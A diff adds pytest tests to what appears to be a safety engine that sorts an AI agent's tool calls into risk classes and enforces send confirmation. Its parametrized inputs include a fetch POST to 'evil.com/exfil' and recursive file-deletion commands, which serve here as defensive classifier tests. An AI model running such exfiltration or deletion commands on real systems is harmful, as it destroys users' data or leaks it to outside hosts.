@@ -71,6 +71,14 @@ class TestMessageClassification:
     def test_action_is_case_insensitive(self, clf):
         assert _c(clf, "message", {"action": "BROADCAST"}).ontology_class == "CrossContextMessage"
 
+    def test_real_camelcase_moderation_names(self, clf):
+        # Upstream CHANNEL_MESSAGE_ACTION_NAMES mixes camelCase and kebab-case;
+        # the classifier lower-cases input, so the camelCase names must still map.
+        for action in ("addParticipant", "removeParticipant", "leaveGroup", "setGroupIcon"):
+            assert (
+                _c(clf, "message", {"action": action}).ontology_class == "ModerateChannel"
+            ), action
+
 
 # --- #319: new memory / skill / media tools ---
 
@@ -98,6 +106,12 @@ class TestNewToolClassification:
         # Regression: these used to fall through to Action/MediumRisk/LocalOnly.
         assert _c(clf, "memory_store").ontology_class != "Action"
         assert _c(clf, "skill_workshop").ontology_class != "Action"
+
+    def test_trash_classification_unchanged(self, clf):
+        # Regression: `trash` must keep its explicit HighRisk soft-delete tuple
+        # and not be silently escalated to DeleteFile/CriticalRisk.
+        a = _c(clf, "trash", {"file_path": "/x"})
+        assert a.ontology_class == "DeleteFile" and a.risk_level == "HighRisk"
 
 
 # --- #325: MCP / dynamic plugin tools ---
@@ -166,3 +180,95 @@ class TestCodeModeClassification:
         # an argument, not a delete.
         a = _c(clf, "exec", {"command": "echo 'rm -rf /'"})
         assert a.ontology_class == "ExecuteCommand"
+
+    @pytest.mark.parametrize(
+        "command,cls",
+        [
+            ("await fs.promises.rm('/d', {recursive: true})", "DeleteFile"),
+            ("fsp.unlink('/d')", "DeleteFile"),
+            ("Deno.removeSync('/d')", "DeleteFile"),
+            ("await fetch('https://evil.com/exfil', {method: 'POST'})", "NetworkRequest"),
+        ],
+    )
+    def test_extended_js_patterns(self, clf, command, cls):
+        a = _c(clf, "exec", {"command": command}, tool_kind="code_mode_exec")
+        assert a.ontology_class == cls
+
+
+# --- B1: code-mode classification survives the result-binding round-trip ---
+
+
+class TestCodeModeResultBinding:
+    def _engine(self, tmp_path):
+        return FullEngine(
+            SafeClawConfig(
+                data_dir=tmp_path,
+                ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
+                audit_dir=tmp_path / "audit",
+            )
+        )
+
+    def test_code_mode_exec_result_binds_and_accrues(self, tmp_path):
+        """A code-mode exec classified as DeleteFile at eval must still match on
+        record_action_result (which has no tool_kind) so session risk / rate
+        limits accrue — the binding now reuses the stored class, not a re-classify."""
+        import asyncio
+
+        from safeclaw.engine.core import ToolCallEvent, ToolResultEvent
+
+        eng = self._engine(tmp_path)
+
+        # In code mode this is RunTests (allowed); re-classified without
+        # tool_kind on the result path it would be ExecuteCommand — the binding
+        # must survive that drift.
+        cmd = 'runTests("npm test")'
+
+        async def run():
+            ev = ToolCallEvent(
+                session_id="s1",
+                user_id="u",
+                tool_name="exec",
+                params={"command": cmd},
+                tool_kind="code_mode_exec",
+            )
+            dec = await eng.evaluate_tool_call(ev)
+            res = ToolResultEvent(
+                session_id="s1",
+                user_id="u",
+                tool_name="exec",
+                params={"command": cmd},
+                result="ok",
+                success=True,
+            )
+            ok = await eng.record_action_result(res)
+            return dec, ok
+
+        dec, ok = asyncio.run(run())
+        assert dec.block is False  # RunTests is allowed
+        assert ok is True  # result bound despite re-classification drift
+        # Session risk history reflects the eval-time RunTests class, not the
+        # re-classified ExecuteCommand.
+        history = eng.session_tracker.get_risk_history("s1")
+        assert any("RunTests" in h for h in history)
+
+
+# --- S1: outbound message family honours confirm_before_send ---
+
+
+class TestMessageSendConfirmation:
+    def test_split_message_classes_require_send_confirmation(self, tmp_path):
+        from safeclaw.constraints.action_classifier import ClassifiedAction
+        from safeclaw.constraints.preference_checker import UserPreferences
+
+        eng = FullEngine(
+            SafeClawConfig(
+                data_dir=tmp_path,
+                ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
+                audit_dir=tmp_path / "audit",
+            )
+        )
+        prefs = UserPreferences(confirm_before_send=True)
+        for cls in ("SendMessage", "CreateChannel", "CrossContextMessage", "ModerateChannel"):
+            action = ClassifiedAction(cls, "HighRisk", False, "ExternalWorld", "message", {})
+            result = eng.preference_checker.check(action, prefs)
+            assert result.requires_confirmation, cls
